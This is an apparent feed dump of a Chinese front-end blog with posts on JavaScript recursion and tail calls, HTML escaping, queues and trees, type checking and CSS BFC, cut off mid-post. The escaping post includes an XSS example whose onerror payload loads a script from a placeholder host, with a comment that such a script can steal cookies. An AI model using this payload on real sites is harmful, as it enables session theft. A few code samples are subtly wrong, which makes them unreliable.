    <content type="html"><![CDATA[<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><blockquote><p>递归函数是在一个函数通过名字调用自身的情况下构成的</p></blockquote><h3 id="看一个经典的递归阶乘函数"><a href="#看一个经典的递归阶乘函数" class="headerlink" title="看一个经典的递归阶乘函数"></a>看一个经典的递归阶乘函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 复杂度 O(n)</span><br><span class="line">function factorial(num) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return num</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return num * factorial(num - 1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归函数调用自身问题"><a href="#递归函数调用自身问题" class="headerlink" title="递归函数调用自身问题"></a>递归函数调用自身问题</h3><ul><li><p>递归调用的函数被重置后会出现问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var anotherFactorial = factorial</span><br><span class="line">factorial = null</span><br><span class="line">anotherFactorial(4) //出错!</span><br></pre></td></tr></table></figure></li><li><p>arguments.callee 是一个指向正在执行函数的指针，因此可以用它来实现对函数的递归调用。但在严格模式下，不能通过脚本访问 arguments.callee，访问这个属性会导致错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function factorial(num) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return num</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">     return num * arguments.callee(num - 1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用命名函数表达式来达成相同的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var factorial = (function f() &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return num</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">     return num * f(num - 1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p>函数f是不对外暴露的，所以执行过程中不会被重置，这种方式在严格模式和 非严格模式下都行得通。</p><h3 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h3><ul><li>尾调用是指函数的最后一步是调用另一个函数。尾调用只保留内层函数的调用记录，可释放掉多余的内存占用。</li><li>尾调用自身，就称为尾递归。递归非常耗费内存，很容易发生”栈溢出”错误（stack overflow）。尾调用指保存一个调用记录，所以不会发生栈溢出的问题。</li></ul><h3 id="利用尾递归重写阶乘函数"><a href="#利用尾递归重写阶乘函数" class="headerlink" title="利用尾递归重写阶乘函数"></a>利用尾递归重写阶乘函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 复杂度 O(1)</span><br><span class="line">function factorial(num, total = 1) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return total</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    total = num * total</span><br><span class="line">    return factorial(num - 1, total)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">factorial(5)</span><br></pre></td></tr></table></figure><p>只要函数执行的最后一步为自身函数调用即可。上面例子中的 num * factorial(num - 1) 也不算尾调用，因为一直保存着对 num 的引用。</p><h3 id="但浏览器一定会识别尾递归的优化吗？"><a href="#但浏览器一定会识别尾递归的优化吗？" class="headerlink" title="但浏览器一定会识别尾递归的优化吗？"></a>但浏览器一定会识别尾递归的优化吗？</h3><ul><li><p>下面在chrome控制台执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 经典阶乘递归函数</span><br><span class="line">function factorial(num) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return num</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return num + factorial(num - 1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">factorial(100000)</span><br><span class="line">// 此时栈溢出：Maximum call stack size exceeded</span><br></pre></td></tr></table></figure></li><li><p>下面再使用尾递归就不会栈溢出了吗？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 尾递归</span><br><span class="line">function factorial(num, total) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return total</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return factorial(num - 1, num + total)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">factorial(100000)</span><br><span class="line">// 此时依然会栈溢出！！！：Maximum call stack size exceeded</span><br></pre></td></tr></table></figure></li><li><p>查询后发现各大浏览器（除了safari）根本就没部署尾调用优化，因为尾调用优化依旧有隐式优化（函数是否符合尾调用而被消除了尾递归很难被开发员自己辨别）和调用栈丢失的问题。</p></li><li><p>node 低版本中本中可以开启尾递归如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// node 6.6.0 版本通过指定参数开启：</span><br><span class="line">// PTC.js</span><br><span class="line">&apos;use strict&apos;;</span><br><span class="line">function f(n, sum = 1) &#123;</span><br><span class="line">    if (n &lt;= 1) &#123;</span><br><span class="line">        return sum;</span><br><span class="line">    &#125;</span><br><span class="line">    return f(n - 1, sum + n);</span><br><span class="line">&#125;</span><br><span class="line">const result = f(100000);</span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">$node --harmony_tailcalls PTC.js  // 5000050000</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;递归&quot;&gt;&lt;a href=&quot;#递归&quot; class=&quot;headerlink&quot; title=&quot;递归&quot;&gt;&lt;/a&gt;递归&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;递归函数是在一个函数通过名字调用自身的情况下构成的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;看一个经典
      
    
    </summary>
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>Question</title>
    <link href="https://fuzhongfeng.github.io/2019/08/20/questions-1/"/>
    <id>https://fuzhongfeng.github.io/2019/08/20/questions-1/</id>
    <published>2019-08-20T08:55:11.000Z</published>
    <updated>2022-01-23T12:24:24.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="开发常见问题"><a href="#开发常见问题" class="headerlink" title="开发常见问题"></a>开发常见问题</h1><hr><h2 id="1-html转义问题"><a href="#1-html转义问题" class="headerlink" title="1. html转义问题"></a>1. html转义问题</h2><h3 id="dom-上的属性被-转义："><a href="#dom-上的属性被-转义：" class="headerlink" title="dom 上的属性被$()转义："></a>dom 上的属性被$()转义：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;&lt;div data-comment=&quot;&#123;&amp;quot;title&amp;quot;:&amp;quot;重难点&amp;quot;,&amp;quot;background&amp;quot;:&amp;quot;rgb(240, 149, 82)&amp;quot;,&amp;quot;icon_src&amp;quot;:&amp;quot;/system/images/171025215642____.png&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&amp;quot;&#125;&quot;&gt;&lt;/div&gt;&apos;)</span><br><span class="line"></span><br><span class="line">// 将div标签上的 data-comment 属性转义后的值如下：</span><br><span class="line">nodeValue: &quot;&#123;&quot;title&quot;:&quot;重难点&quot;,&quot;background&quot;:&quot;rgb(240, 149, 82)&quot;,&quot;icon_src&quot;:&quot;/system/images/171025215642____.png&quot;,&quot;content&quot;:&quot;11111&lt;br &gt;&lt;/div&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;&#125;&quot; </span><br><span class="line">// 明显多出来一个&lt;/div&gt;啊</span><br></pre></td></tr></table></figure><blockquote><p>解决办法</p><ol><li>lodash 的 escape 和 unescape(推荐)</li></ol><ul><li>_.escape：转换字符串中的 <code>&quot;&amp;&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &#39;&quot;&#39;, &quot;&#39;&quot;</code> 为HTML的响应实体字符，没有其他多余的字符被转义。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.escape(&apos;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&apos;)</span><br><span class="line">// &quot;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&quot;</span><br></pre></td></tr></table></figure></li></ul></blockquote><ul><li><p>_.usescape：转换字符串中的实体字符 <code>&amp;amp;, &amp;lt;, &amp;gt;, &amp;quot;, &amp;#39;</code> 为响应的 HTML 字符。与escape中的字符一一对应。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.unescape(&apos;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&apos;)</span><br><span class="line">// &quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;</span><br></pre></td></tr></table></figure></li><li><p>如果不反转义直接放到dom中呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 浏览器会反转义一次字符串，结果展示到页面上：</span><br><span class="line">11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt; // 纯字符串</span><br></pre></td></tr></table></figure></li><li><p>当在浏览器控制台选中dom后，右键选择：”Edit as HTML”后，展示的输入框内容相当于进行了一次 escape，确定输入后又进行了一次 unescape, HTML 中的预留字符必须被替换为字符实体。</p></li></ul><ol start="2"><li>利用 jquery<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// HTML标签转义（&lt; 转为 &amp;lt;）</span><br><span class="line">function html2Escape(sHtml) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).text(sHtml).html();</span><br><span class="line">&#125;</span><br><span class="line">// HTML标签反转义（&amp;lt; 转为 &lt;）</span><br><span class="line">function escape2Html(str) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).html(str).text();</span><br><span class="line">&#125;</span><br><span class="line">// 此方法在反转义的时候会将形如：1&lt;br &gt;&lt;/div&gt;2&lt;br /&gt;3&lt;br /&gt;的内容反转为123</span><br></pre></td></tr></table></figure></li></ol><h3 id="除了被-转义外，其他情况有哪些呢？"><a href="#除了被-转义外，其他情况有哪些呢？" class="headerlink" title="除了被 $() 转义外，其他情况有哪些呢？"></a>除了被 $() 转义外，其他情况有哪些呢？</h3><ol><li>XSS 攻击<br>在浏览器上随便选择一个 dom，控制台执行如下代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$0.innerHTML=&quot;&lt;img src=@ onerror=alert(1)&gt;&quot; // alert(1)</span><br><span class="line"></span><br><span class="line">$0.innerHTML = &quot;&lt;img src=@ onerror=&apos;var s=document.createElement(\&quot;script\&quot;);s.src=\&quot;https://xxx.com/xx.js\&quot;;document.body.appendChild(s);&apos; /&gt;&quot;</span><br><span class="line">// 代码中引入了一个第三方的脚本，这样做的事情就多了，从取你的 cookie，发送到黑客自己的服务器，到监听你的输入，到发起 CSRF 攻击，直接以你的身份调用网站的各种接口等</span><br></pre></td></tr></table></figure></li></ol><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;开发常见问题&quot;&gt;&lt;a href=&quot;#开发常见问题&quot; class=&quot;headerlink&quot; title=&quot;开发常见问题&quot;&gt;&lt;/a&gt;开发常见问题&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;1-html转义问题&quot;&gt;&lt;a href=&quot;#1-html转义问题&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="Question" scheme="https://fuzhongfeng.github.io/categories/Question/"/>
    
    
      <category term="Question" scheme="https://fuzhongfeng.github.io/tags/Question/"/>
    
  </entry>
  
  <entry>
    <title>数据结构</title>
    <link href="https://fuzhongfeng.github.io/2019/07/05/data-structure/"/>
    <id>https://fuzhongfeng.github.io/2019/07/05/data-structure/</id>
    <published>2019-07-05T13:31:20.000Z</published>
    <updated>2022-01-23T12:24:24.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><blockquote><p>概念：队列是一种线性结构，特点是在某一端添加数据，在另一端删除数据，遵循先进先出的原则。</p></blockquote><h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><ol><li>单链队列<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Queue &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.queue = []</span><br><span class="line">    &#125;</span><br><span class="line">    enQueue(item) &#123;</span><br><span class="line">        this.queue.push(item)</span><br><span class="line">    &#125;</span><br><span class="line">    deQueue() &#123;</span><br><span class="line">        return this.queue.shift()</span><br><span class="line">    &#125;</span><br><span class="line">    getHeader() &#123;</span><br><span class="line">        return this.queue[0]</span><br><span class="line">    &#125;</span><br><span class="line">    getLength() &#123;</span><br><span class="line">        return this.queue.length</span><br><span class="line">    &#125;</span><br><span class="line">    isEmpty() &#123;</span><br><span class="line">        return this.getLength() === 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>单链队列的出队操作的时间复杂度为O(n), 然而循环队列的出队操作的时间复杂度为O(1)</p><h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><blockquote><p>树里的每一个节点有一个值和一个包含所有子节点的列表。从图的观点来看，树也可视为一个拥有 N 个节点和 N-1 条边的一个有向无环图。</p></blockquote><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><blockquote><p>是一种更为典型的树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。</p></blockquote><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p>前中后序都是只根节点的顺序</p><ul><li><p>前序遍历</p><blockquote><p>前序遍历首先访问根节点，然后遍历左子树，最后遍历右子树。</p></blockquote></li><li><p>中序遍历</p><blockquote><p>中序遍历是先遍历左子树，然后访问根节点，然后遍历右子树。</p></blockquote></li><li><p>后序遍历</p><blockquote><p>后序遍历是先遍历左子树，然后遍历右子树，最后访问树的根节点。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;队列&quot;&gt;&lt;a href=&quot;#队列&quot; class=&quot;headerlink&quot; title=&quot;队列&quot;&gt;&lt;/a&gt;队列&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;概念：队列是一种线性结构，特点是在某一端添加数据，在另一端删除数据，遵循先进先出的原则。&lt;/p&gt;
&lt;/blockq
      
    
    </summary>
    
      <category term="Data Structure And Algorithm" scheme="https://fuzhongfeng.github.io/categories/Data-Structure-And-Algorithm/"/>
    
    
      <category term="Data Structure And Algorithm" scheme="https://fuzhongfeng.github.io/tags/Data-Structure-And-Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript-类型判断</title>
    <link href="https://fuzhongfeng.github.io/2019/03/08/2019-3-8-javascript-typeJudge/"/>
    <id>https://fuzhongfeng.github.io/2019/03/08/2019-3-8-javascript-typeJudge/</id>
    <published>2019-03-08T12:05:21.000Z</published>
    <updated>2022-01-23T12:24:24.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><blockquote><p>说到 javascript 中的类型判断方法有很多。如 typeof、instanceof、Array.isArray()、Object.prototype.toString.call()，下面会详细讲解优缺点及具体用法以及最佳方案。</p></blockquote><h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><blockquote><p>typeof 适用于检测基本数据类型</p></blockquote><ul><li><p>typeof 操作符可能返回下列字符串:<br>“undefined”——如果这个值未定义<br>“boolean”——如果这个值是布尔值<br>“string”——如果这个值是字符串<br>“number”——如果这个值是数值<br>“object”——如果这个值是对象或null<br>“function”——如果这个值是函数</p></li><li><p>看下面的返回值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typeof [] // &quot;object&quot;</span><br><span class="line">typeof new Date() // &quot;object&quot;</span><br><span class="line">typeof new RegExp() // &quot;object&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><blockquote><p>instanceof 适用于检测引用类型的值，如果构造函数的prototype属性在实例的原型链中出现过则返回true。</p></blockquote><ul><li><p>如果变量 variable 是引用类型 constructor 的实例，则返回 true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable instanceof constructor;</span><br></pre></td></tr></table></figure></li><li><p>看下面的返回值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[] instanceof Array // true</span><br></pre></td></tr></table></figure></li><li><p>但如果不在同一个全局环境中执行，instanceof 就不能正常使用，因为不同的全局环境下的构造函数时不同的。看下面的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// index.html 文件</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;iframe src=&quot;./inner.html&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    window.onload = function () &#123;</span><br><span class="line">        var arr = [1, 2, 3];</span><br><span class="line">        var f = function() &#123;&#125;</span><br><span class="line">        window.frames[0].func(arr, f);</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(window.Array === window.frames[0].Array) // false</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">// inner.html</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var func = function(arr, f) &#123;</span><br><span class="line">            console.log(arr instanceof Array) // false</span><br><span class="line">            console.log(f instanceof Function) // false</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></li></ul><ol><li>这里可以关于数组的判断可以使用 Array.isArray() 来判断。支持浏览器的方法有 IE9+、Firefox4+、Safari5+、Opera10.5+、chrome。</li><li>从父级中传入的函数 f 无法判断。</li></ol><h3 id="最佳方案-Object-prototype-toString-call"><a href="#最佳方案-Object-prototype-toString-call" class="headerlink" title="最佳方案 Object.prototype.toString.call()"></a>最佳方案 Object.prototype.toString.call()</h3><blockquote><p>在任何值上调用 Object 原生的方法 toString() 方法，都会返回一个[object NativeConstructorName]格式的字符串。每个类在内部都有一个[[Class]]属性，这个属性中就指定了上述字符串中的构造函数名。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// 字符串</span><br><span class="line">Object.prototype.toString.call(&apos;a&apos;) // &quot;[object String]&quot;</span><br><span class="line">// 数字</span><br><span class="line">Object.prototype.toString.call(1) // &quot;[object Number]&quot;</span><br><span class="line">// Boolean</span><br><span class="line">Object.prototype.toString.call(true) // &quot;[object Boolean]&quot;</span><br><span class="line">// undefined </span><br><span class="line">Object.prototype.toString.call(undefined) // &quot;[object Undefined]&quot;</span><br><span class="line">// null</span><br><span class="line">Object.prototype.toString.call(null) // &quot;[object Null]&quot;</span><br><span class="line">// Symbol</span><br><span class="line">Object.prototype.toString.call(Symbol()) // &quot;[object Symbol]&quot;</span><br><span class="line">// 数组</span><br><span class="line">Object.prototype.toString.call([]) // &quot;[object Array]&quot;</span><br><span class="line">// 对象</span><br><span class="line">Object.prototype.toString.call(&#123;&#125;) // &quot;[object Object]&quot;</span><br><span class="line">// 函数</span><br><span class="line">Object.prototype.toString.call(function() &#123;&#125;) // &quot;[object Function]&quot;</span><br><span class="line">// RegExp</span><br><span class="line">Object.prototype.toString.call(/a/) // &quot;[object RegExp]&quot;</span><br><span class="line">// Date</span><br><span class="line">Object.prototype.toString.call(new Date()) // &quot;[object Date]&quot;</span><br><span class="line">// Map</span><br><span class="line">Object.prototype.toString.call(new Map()) // &quot;[object Map]&quot;</span><br><span class="line">// Set</span><br><span class="line">Object.prototype.toString.call(new Set()) // &quot;[object Set]&quot;</span><br><span class="line">// Math</span><br><span class="line">Object.prototype.toString.call(Math) // &quot;[object Math]&quot;</span><br><span class="line">// JSON</span><br><span class="line">Object.prototype.toString.call(JSON) // &quot;[object JSON]&quot;</span><br><span class="line">// Error</span><br><span class="line">Object.prototype.toString.call(new Error()) // &quot;[object Error]&quot;</span><br></pre></td></tr></table></figure><ul><li>兼容性也很好：Edge12+、Firefox1+、Firefox for Android4+、及其他浏览器</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;类型判断&quot;&gt;&lt;a href=&quot;#类型判断&quot; class=&quot;headerlink&quot; title=&quot;类型判断&quot;&gt;&lt;/a&gt;类型判断&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;说到 javascript 中的类型判断方法有很多。如 typeof、instanceof、Arr
      
    
    </summary>
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>CSS-BFC</title>
    <link href="https://fuzhongfeng.github.io/2019/02/17/css-bfc/"/>
    <id>https://fuzhongfeng.github.io/2019/02/17/css-bfc/</id>
    <published>2019-02-17T12:21:10.000Z</published>
    <updated>2022-01-23T12:24:24.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><blockquote><p>BFC(Block Formatting Context)是 Web 页面中盒模型布局的 CSS 渲染模式，它的定位体系属于常规文档流。</p></blockquote><h4 id="创建-BFC"><a href="#创建-BFC" class="headerlink" title="创建 BFC"></a>创建 BFC</h4><ul><li>根元素，即 HTML 元素</li><li>float 的值不为 none</li><li>overflow 的值不为 visible</li><li>display 的值为 inline-block、table-cell、table-caption</li><li>position 的值为 absolute 或 fixed</li></ul><h4 id="BFC-特性"><a href="#BFC-特性" class="headerlink" title="BFC 特性"></a>BFC 特性</h4><ul><li>内部的 Box 会在垂直方向，从顶部开始一个接一个地放置</li><li>Box 垂直方向的距离由 margin 决定。属于同一个 BFC 的两个相邻 Box 的 margin 会发生叠加</li><li>每个元素的 margin box 的左边， 与包含块 border box 的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此</li><li>BFC 的区域不会与 float box 叠加<br>例子：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--下面是css代码--&gt;</span><br><span class="line"> .aside &#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 150px;</span><br><span class="line">    float: left;</span><br><span class="line">    background: #f66;</span><br><span class="line">  &#125;</span><br><span class="line">  .main &#123;</span><br><span class="line">    height: 200px;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    background: #fcc;</span><br><span class="line">  &#125;</span><br><span class="line">  .text&#123;</span><br><span class="line">    width: 500px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;div class=&quot;aside&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;text&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;main&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">// 不添加 overflow: hidden 时会出现叠加的情况，加上之后不会再叠加</span><br></pre></td></tr></table></figure><ul><li>BFC 就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素，反之亦然</li><li>计算 BFC 的高度时，浮动元素也参与计算</li></ul><h4 id="BFC-的作用"><a href="#BFC-的作用" class="headerlink" title="BFC 的作用"></a>BFC 的作用</h4><ul><li>分属于不同的BFC时可以阻止 margin 重叠</li><li>可以阻止元素被浮动元素覆盖</li><li>通过定义一个 BFC 可以解决容器中由于存在浮动元素而导致的脱离常规文档流问题</li><li>使用 BFC 防止文字环绕，看下面的例子：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    .container &#123;</span><br><span class="line">      height: 300px;</span><br><span class="line">      width: 300px;</span><br><span class="line">      background: red;</span><br><span class="line">    &#125;</span><br><span class="line">    .floated &#123;</span><br><span class="line">      height: 100px;</span><br><span class="line">      